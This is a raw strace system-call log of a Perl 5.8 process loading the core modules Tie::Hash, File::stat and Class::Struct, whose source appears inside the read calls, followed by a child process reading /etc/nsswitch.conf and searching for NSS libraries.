5779  07:10:39.143029 stat64("/etc/perl/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143047 stat64("/etc/perl/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143065 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143078 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143092 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143104 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143118 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143130 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143143 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143155 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143168 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143180 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143193 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.143206 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
5779  07:10:39.143227 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.143241 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.143252 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.143271 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
5779  07:10:39.143628 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
5779  07:10:39.144178 read(8, "", 4096) = 0
5779  07:10:39.144193 close(8)          = 0
5779  07:10:39.144224 stat64("/etc/perl/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144239 stat64("/etc/perl/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144252 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144265 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144289 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144333 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144348 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144377 stat64("/usr/lib/perl5/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144428 stat64("/usr/share/perl5/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144440 stat64("/usr/share/perl5/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144471 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144483 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144497 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.144509 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
5779  07:10:39.144530 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.144545 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.144556 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.144573 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
5779  07:10:39.145040 stat64("/etc/perl/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145059 stat64("/etc/perl/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145073 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145085 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145100 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145113 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145127 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145139 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145152 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145164 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145177 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145190 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.145208 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.145222 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
5779  07:10:39.145242 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
5779  07:10:39.145257 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb6cc8) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.145269 _llseek(10, 0, [0], SEEK_CUR) = 0
5779  07:10:39.145327 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
5779  07:10:39.145727 brk(0x82de000)    = 0x82de000
5779  07:10:39.146796 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
5779  07:10:39.147388 _llseek(10, 6916, [6916], SEEK_SET) = 0
5779  07:10:39.147404 _llseek(10, 0, [6916], SEEK_CUR) = 0
5779  07:10:39.147416 close(10)         = 0
5779  07:10:39.147495 _llseek(8, 1334, [1334], SEEK_SET) = 0
5779  07:10:39.147511 _llseek(8, 0, [1334], SEEK_CUR) = 0
5779  07:10:39.147521 close(8)          = 0
5779  07:10:39.148168 brk(0x82ff000)    = 0x82ff000
5779  07:10:39.148370 _llseek(6, 2689, [2689], SEEK_SET) = 0
5779  07:10:39.148387 _llseek(6, 0, [2689], SEEK_CUR) = 0
5779  07:10:39.148398 close(6)          = 0
5779  07:10:39.148535 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d32908) = 5780
5780  07:10:39.185681 getppid()         = 5779
5780  07:10:39.186192 open("/etc/nsswitch.conf", O_RDONLY) = 6
5780  07:10:39.195792 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5780  07:10:39.195792 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef8000
5780  07:10:39.195793 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5780  07:10:39.195793 read(6, "", 4096) = 0
5780  07:10:39.195793 close(6)          = 0
5780  07:10:39.195794 munmap(0xb7ef8000, 4096) = 0
5780  07:10:39.195824 open("/etc/ld.so.cache", O_RDONLY) = 6
5780  07:10:39.195837 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5780  07:10:39.195854 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7cff000
5780  07:10:39.195865 close(6)          = 0
5780  07:10:39.195876 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5780  07:10:39.195894 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.195908 stat64("/lib/tls/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.195922 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.195936 stat64("/lib/tls/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.195947 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.195960 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.195977 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.195996 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
